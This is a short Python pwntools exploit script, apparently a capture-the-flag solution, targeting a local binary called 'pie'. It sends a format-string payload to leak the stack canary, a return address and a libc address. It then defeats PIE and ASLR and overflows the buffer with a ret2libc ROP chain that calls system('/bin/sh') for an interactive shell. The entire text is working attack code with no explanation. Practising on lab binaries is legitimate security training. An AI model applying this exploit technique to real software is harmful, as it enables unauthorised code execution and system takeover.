from pwn import *

p = process("./pie")
elf = ELF("./pie")
libc = elf.libc
rop = ROP(elf)

payload = b"%23$p-%25$p-%27$p-"
p.recv()
p.sendline(payload)
leak = p.recv()

canary = int(leak.split(b"-")[0], 16)
leak_ret = int(leak.split(b"-")[1], 16)
main_address = leak_ret - 26
base = main_address - elf.symbols['main']

libc_start_main = int(leak.split(b"-")[2], 16) - 243
libc_base = libc_start_main - libc.symbols['__libc_start_main']
system_address = libc_base + libc.symbols['system']
sh_str = libc_base + next(libc.search(b'/bin/sh'))

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] + base
ret = 0x0000000000001016 + base
payload = b'a'*120 + p64(canary) + b'a'*8 + p64(pop_rdi) + p64(sh_str) + p64(ret) + p64(system_address)
p.sendline(payload)

p.interactive()
